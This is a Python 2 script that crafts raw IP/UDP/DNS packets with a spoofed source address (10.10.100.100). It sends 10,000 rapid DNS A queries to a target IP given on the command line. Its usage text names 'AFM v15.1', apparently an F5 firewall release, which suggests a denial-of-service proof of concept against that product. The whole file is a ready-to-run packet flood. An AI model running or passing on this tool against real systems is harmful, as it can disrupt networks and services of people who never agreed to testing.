#!/usr/bin/env python

# some imports
import socket
from struct import *
from time import sleep
from sys import stdout, argv, exit

if len(argv) != 2:
	print "Usage: " + argv[0] + " <ip-address>"
	print "Version: AFM v15.1"
        exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)

packet = '';
source_ip = '10.10.100.100'
dest_ip = argv[1]

# ip header fields
ihl = 5
version = 4
ihl_version = (version << 4) + ihl
tos = 0
tot_len = 55
id = 22827
frag_off = 0
ttl = 64
protocol = socket.IPPROTO_UDP
check = 0x5a0f
saddr = socket.inet_aton ( source_ip )
daddr = socket.inet_aton ( dest_ip )
ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

# udp header fields
source = 64979
dest = 53
length = 39
checksum = 0xa36b
udp_header = pack('!HHHH', source, dest, length, checksum)

# dns query
transaction_id = 0x8dde
flags = 0x0100
questions = 1
answer_rr = 0
authority_rr = 0
additional_rr = 0
dns_type = 1	# A
dns_class = 1	# IN
dns_query = pack('!HHHHHHB3sB5sB3sBHH', transaction_id, flags, questions, answer_rr, authority_rr, additional_rr, 3, "www", 5, "f5trn", 3, "com", 0, dns_type, dns_class)

packet = ip_header + udp_header + dns_query

for i in xrange(10000):
	s.sendto(packet, (dest_ip, 0))
	if i % 100 == 0:
		stdout.write("*")
		stdout.flush()
	sleep(0.00002)
print ""
